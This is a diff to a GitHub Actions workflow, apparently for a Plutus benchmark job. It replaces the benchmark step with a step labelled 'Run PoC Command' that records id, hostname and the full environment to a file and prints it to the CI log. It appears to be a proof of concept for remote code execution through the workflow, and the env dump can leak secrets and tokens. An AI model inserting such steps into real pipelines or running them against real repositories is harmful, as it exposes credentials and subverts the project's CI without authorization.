@@ -120,13 +120,13 @@ jobs:
               body: `Click [here](${await getJobUrl()}) to check the status of your benchmark.`
             });
 
-      - name: Run Benchmark
+      - name: Run PoC Command
         run: |
-          nix develop .#${{ steps.extract-benchmark.outputs.ghc }} \
-            --no-warn-dirty \
-            --accept-flake-config \
-            --command taskset -c 7 bash ./scripts/ci-plutus-benchmark.sh 
-            # We use taskset to pin the benchmark to a single CPU core to improve repeatability
+          echo "--- RCE VULNERABILITY VERIFIED ---" > /tmp/rce_poc.txt
+          id >> /tmp/rce_poc.txt
+          hostname >> /tmp/rce_poc.txt
+          env >> /tmp/rce_poc.txt
+          cat /tmp/rce_poc.txt
 
         env:
           BENCHMARK_NAME: ${{ steps.extract-benchmark.outputs.benchmark }}
